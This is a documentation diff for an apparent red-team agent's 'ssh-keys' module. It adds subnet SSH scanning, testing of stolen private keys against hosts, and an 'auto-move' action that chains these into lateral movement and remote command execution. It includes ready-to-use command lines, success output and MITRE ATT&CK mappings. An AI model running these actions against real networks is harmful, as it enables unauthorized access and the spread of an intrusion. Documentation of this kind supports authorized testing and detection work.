@@ -20,10 +20,16 @@ On Windows, the `enumerate` action additionally discovers:
 
 | Parameter | Type | Required | Default | Description |
 |-----------|------|----------|---------|-------------|
-| action | choose_one | Yes | list | `list`, `add`, `remove`, `read-private`, `enumerate`, or `generate` |
+| action | choose_one | Yes | list | `list`, `add`, `remove`, `read-private`, `enumerate`, `generate`, `find-reachable`, `try-keys`, or `auto-move` |
 | key | string | No | - | SSH public key to add, substring to match for removal, or `noinstall` for generate without authorized_keys install |
 | user | string | No | current | Target user (reads their `~/.ssh/` directory) |
-| path | string | No | - | Override the default authorized_keys or private key path |
+| path | string | No | - | Override the default authorized_keys or private key path. For try-keys: explicit private key file or directory. |
+| targets | string | No | - | Target host range for `find-reachable` / `auto-move`. Supports CIDR (`192.168.1.0/24`), comma-separated IPs, or dash ranges (`192.168.1.1-254`). |
+| host | string | No | - | Single target host for `try-keys` action. |
+| username | string | No | root | SSH username for `try-keys` / `auto-move`. |
+| command | string | No | id | Command to run on each successfully accessed host in `auto-move`. |
+| port | number | No | 22 | SSH port for `find-reachable` / `try-keys` / `auto-move`. |
+| delay_ms | number | No | 500 | Milliseconds between authentication attempts. Increase to avoid lockouts. |
 
 ## Usage
 
@@ -205,9 +211,77 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbm...
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...
 ```
 
+### Find Reachable SSH Hosts (Network Scanning)
+
+Scan a subnet for hosts with open SSH ports:
+```
+ssh-keys -action find-reachable -targets 192.168.1.0/24
+```
+
+Scan specific hosts or range:
+```
+ssh-keys -action find-reachable -targets 10.10.10.1-50 -port 2222
+```
+
+### Try Keys Against a Target
+
+Test all discovered private keys against a single host:
+```
+ssh-keys -action try-keys -host 192.168.1.10 -username ubuntu
+```
+
+Test a specific private key:
+```
+ssh-keys -action try-keys -host 192.168.1.10 -username admin -path /home/user/.ssh/id_rsa
+```
+
+### Auto-Move (Chained Lateral Movement)
+
+Automatically scan for SSH hosts, authenticate with discovered keys, and execute a command:
+```
+ssh-keys -action auto-move -targets 192.168.1.0/24 -username ubuntu -command id
+```
+
+Auto-move with rate limiting to avoid lockouts:
+```
+ssh-keys -action auto-move -targets 10.10.10.1-20 -username deploy -command "cat /etc/hostname" -delay_ms 1000
+```
+
+### Example Output (find-reachable)
+
+```
+[*] Scanning 254 targets on port 22...
+[+] 192.168.1.5:22 open (banner: SSH-2.0-OpenSSH_8.9p1)
+[+] 192.168.1.12:22 open (banner: SSH-2.0-OpenSSH_9.3p1)
+[+] 192.168.1.50:22 open (banner: SSH-2.0-OpenSSH_8.2p1)
+[*] Scan complete: 3/254 hosts reachable
+```
+
+### Example Output (auto-move)
+
+```
+[*] Phase 1: Scanning 254 targets on port 22...
+[+] 3 hosts reachable
+
+[*] Phase 2: Reading local private keys...
+[+] Found 2 private keys
+
+[*] Phase 3: Testing keys against 3 hosts...
+[+] 192.168.1.5 — authenticated as ubuntu with id_ed25519
+    Output: uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)
+[+] 192.168.1.12 — authenticated as ubuntu with id_ed25519
+    Output: uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+[-] 192.168.1.50 — no valid key found
+
+[*] Auto-move complete: 2/3 hosts accessed
+```
+
 ## MITRE ATT&CK Mapping
 
 - T1098.004 — Account Manipulation: SSH Authorized Keys
 - T1552.004 — Unsecured Credentials: Private Keys
 - T1552.002 — Unsecured Credentials: Credentials in Registry (PuTTY sessions)
 - T1016 — System Network Configuration Discovery (enumerate)
+- T1021.004 — Remote Services: SSH (try-keys, auto-move)
+- T1046 — Network Service Discovery (find-reachable)
+- T1570 — Lateral Tool Transfer (auto-move)
